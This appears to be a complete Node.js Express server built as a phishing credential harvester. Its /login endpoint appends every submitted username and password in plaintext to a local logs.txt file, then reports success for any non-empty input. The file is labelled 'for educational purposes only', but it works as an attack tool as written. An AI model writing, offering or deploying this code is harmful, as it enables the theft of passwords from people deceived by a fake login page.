const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

// Middleware to parse JSON data
app.use(bodyParser.json());

// Serve static files (HTML, CSS, JS)
app.use(express.static('public'));

// Endpoint to handle login attempts
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Log the credentials to a file
    const logEntry = `Username: ${username}, Password: ${password}\n`;
    fs.appendFile(path.join(__dirname, 'logs.txt'), logEntry, (err) => {
        if (err) {
            console.error('Failed to log credentials:', err);
            return res.status(500).json({ success: false });
        }

        // Simulate a login attempt (for educational purposes only)
        const isLoginSuccessful = simulateLogin(username, password);

        // Respond to the client
        res.json({ success: isLoginSuccessful });
    });
});

// Function to simulate a login attempt
function simulateLogin(username, password) {
    // Replace this with your own logic to check credentials
    // For educational purposes, we'll assume any non-empty credentials are valid
    return username && password;
}

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
